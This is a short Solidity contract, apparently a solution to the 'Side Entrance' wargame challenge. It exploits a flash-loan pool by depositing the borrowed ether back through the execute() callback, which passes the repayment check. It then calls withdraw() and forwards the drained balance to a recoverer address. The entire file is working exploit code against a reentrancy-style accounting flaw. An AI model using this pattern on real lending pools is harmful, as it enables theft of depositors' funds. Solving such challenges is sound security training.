// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract SideEntrant {
    address payable public pool;
    address payable public recoverer;

    constructor(address _pool, address _recoverer) {
        pool = payable(_pool);
        recoverer = payable(_recoverer);
    }

    function execute() external payable {
        (bool success, ) = pool.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "failed to deposit");
    }
    function start(uint256 amount) external payable {
        (bool success, ) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
        require(success, "failed to initiate FlashLoan");
    }

    function recover() external payable {
        (bool success, ) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(success, "unable to withdraw from pool");
        recoverer.transfer(getBalance());
    }

    receive() external payable {}

    fallback() external payable {}

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}